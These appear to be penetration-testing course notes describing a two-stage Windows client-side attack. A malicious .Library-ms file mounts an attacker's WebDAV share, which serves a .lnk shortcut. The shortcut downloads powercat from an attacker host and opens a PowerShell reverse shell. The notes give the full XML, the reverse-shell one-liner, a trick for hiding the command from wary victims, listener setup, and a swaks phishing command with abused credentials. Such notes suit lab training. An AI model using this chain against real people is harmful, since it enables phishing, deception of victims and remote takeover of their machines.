- Virtual containers for user content
- Connects users with data stored in remote locations like web services or shares
- Have a **.Library-ms** file extension and can be executed by double-clicking

### Two-stage client attack
1. Use Windows library files to gain a foothold on the target system and set up the second stage
	1. Create a Windows library file connecting to a _WebDAV_ share we'll set up
	2. Victim receives a **.Library-ms** file, perhaps via email
	3. They double click the file
		- Displays the remote location (our WebDAV folder) as if it were a local directory on the victim's computer
	4. In the WebDAV directory, we'll provide a payload in the form of a **.lnk** shortcut file for the second stage to execute a PowerShell reverse shell
		- The victim *has* to double click on the **.lnk** file
2. Use the foothold to provide an executable file that will start a reverse shell when double-clicked


# Setup WebDAV server

- Install *wsgidav* for the WebDAV server
- Make a directory specifically for the server & add a test file
- Start the server where:
	- The server host is listening on all ports
	- The port is 80
	- Authorization to the server is disabled
	- The server root is set to the previously made directory
```bash
# Install
pip3 install wsgidav

# Create dir for server
mkdir /home/kali/webdav
touch /home/kali/webdav/test.txt

# Run server
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```

# Create Library File
Library files
- Consist of three major parts
	- General Library Information
	- Library Properties
	- Library Locations
- Written in XML to specify the parameters for accessing remote locations
- Refer to the [Library Description Schema](https://docs.microsoft.com/en-us/windows/win32/shell/library-schema-entry) for further information.

- Connect to Windows client
- Use VSC or Notepad to create **config.Library-ms**
	- Once saved, its icon will be updated to something rarely seen/ used, so we'll change it in its code
	  ![](config-library-ms.png)
- Build the XML code
```xml
<?xml version="1.0" encoding="UTF-8"?>

<!--Namespace for the library file's format version (starting Win 7)-->
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">

<!--Name specifies name of the library (DLL name & index)-->
<name>@windows.storage.dll,-34582</name>
<!--Set to numerical value of our choice-->
<version>6</version>

<!--Specifies if library is pinned to Explorer's navigation pane-->
<isLibraryPinned>true</isLibraryPinned>
<!--Determines icon used to display library file-->
<!--imagesres.dll to choose between all Windows icons. index "-1002" for Documents folder icon. "-1003" for Pictures folder icon.-->
<iconReference>imageres.dll,-1003</iconReference>

<!--Determines columns and details that appear in Explorer by default after opening-->
<!--use the Documents GUID to appear as convincing as possible-->
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>

<!--Library locations section-->
<!--Specify storage location where library file should point to-->

<!--Search Connectors specify the connection settings to remote locations-->
<searchConnectorDescriptionList>
<searchConnectorDescription>

<!--Determines behavior of Explorer when a user saves an item. True = Default location & behavior-->
<isDefaultSaveLocation>true</isDefaultSaveLocation>

<!--Used for compatibility-->
<isSupported>false</isSupported>

<!--Point to created WebDAV share over HTTP-->
<simpleLocation>
<url>http://192.168.45.167</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>

</libraryDescription>
```

- Double-click to test
![](config-library-ms-test.png)

- Back in the config file
	- More info is entered in the *url* tag
		- Windows attempt at optimizing the connection info
	- *serialized* tag is created
		- Contains base64-encoded information about the location of the _url_ tag
		- May not be working on other machines or after a restart
			- Can get passed by resetting file each time.

- Once double-clicked, the config file will receive the Mark of the Web tag

# Create Shortcut File
- Rt-click Windows Desktop > New > Shortcut
	- Set location
```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.167:8000/powercat.ps1'); powercat -c 192.168.45.167 -p 4444 -e powershell"
```

	\* Note - If we expect that our victims are tech-savvy enough to actually check where the shortcut files are pointing, we can use a handy trick.
	Since our provided command looks very suspicious, we could just put a delimiter and benign command behind it to push the malicious command
	out of the visible area in the file's property menu. If a user were to check the shortcut, they would only see the benign command.

- Name shortcut **automatic_configuration**
	- Can also change Icon via Properties
- Test by creating python server on port 8000 for powercat.ps1 and nc listener to verify .lnk file works

# Attack
## Setup
- Use the created config Library to connect back to the WebDAV server on kali
- Copy/ Paste the **config.Library-ms** (reset *url* tags first) and **automation_configuration.lnk**
- Delivery to victim most likely through email
	- Use the SMB share **\\\\192.168.228.195\\share** to simulate delivery

## Deliver & Exploit
- Setup Python server for powercat.ps1
- Setup WebDAV server for exploit
- Setup nc listener
```bash
# Tab 1
# cd to directory w/ powercat.ps1
python -m http.server 8000

# Tab 2
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/

# Tab 3
nc -nlvp 4444
```

- Upload file to SMB share for simulated user to open
```bash
cd webdav
rm test.txt
smbclient //192.168.228.195/share -c 'put config.Library-ms'
```

- If sending via SMTP
```bash
swaks --to <victim email> --from <abused email> --server 192.168.228.199 --auth-user <abused email> -auth-password <abused pw> --attach /home/kali/webdav/config.Library-ms --header "test" --body "config file for software"
```


- Should have a reverse shell
